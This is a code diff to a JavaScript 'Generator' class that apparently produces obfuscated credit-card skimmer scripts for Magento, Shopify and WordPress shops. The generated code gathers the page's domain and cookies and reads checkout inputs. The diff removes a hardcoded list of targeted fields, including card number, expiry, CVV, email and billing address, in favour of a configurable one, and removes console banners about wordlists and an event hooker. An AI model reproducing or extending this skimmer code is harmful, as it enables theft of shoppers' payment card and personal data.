@@ -61,16 +61,7 @@ export class Generator {
       var data = "&domain="+ document.domain + "&cookie=" + document.cookie;
       `+`const ics = [`+this.parseJsonContent(2)+`];
       `+`const its = [`+this.parseJsonContent(3)+`];
-      const iks = ['checkout_email','checkout_shipping_address_first_name',
-                   'checkout_shipping_address_last_name','checkout_shipping_address_company',
-                   'checkout_shipping_address_address1','checkout_shipping_address_address2',
-                   'checkout_shipping_address_zip','checkout_shipping_address_city','checkout_shipping_address_province',
-                   'checkout_shipping_address_phone','number','name','expiry','verification_value','firstName',
-                   'lastName','address1','postalCode','city','country','email','phoneNumber','creditCardNumber','expirationDate',
-                   'cvNumber','billing_first_name','billing_last_name','billing_country_field',
-                   'billing_address_1','billing_address_2','billing_postcode','billing_city',
-                   'select2-billing_state-container','billing_phone','billing_email',`+this.parseJsonContent(1)+`
-      ];
+         const iks = [`+this.parseJsonContent(1)+`];
       its.forEach((it)=>{
         const a = document.getElementsByTagName(it);
         for (var i = 0; i < a.length; i++){
@@ -107,11 +98,6 @@ export class Generator {
         splitStrings: true,
         stringArrayThreshold: 1
     });
-     console.log('[X]',this.loader.colorStr(this.loader.color.Cyan,'Wordlist Init: '+this.loader.colorStr(this.loader.color.Red,'Magento')+','+this.loader.colorStr(this.loader.color.Green,'Shopify')+','+this.loader.colorStr(this.loader.color.Blue,'Wordpress')));
-     var d = this.conf.eventhk?" Enable":" Disable";
-     var g = this.conf.randomName?" Enable":" Disable";
-     console.log('[X]',this.loader.colorStr(this.loader.color.Cyan,'Event Hooker:')+d)
-     console.log('[X]',this.loader.colorStr(this.loader.color.Cyan,'Random Name:')+g)
      return a.getObfuscatedCode();
    }
 }
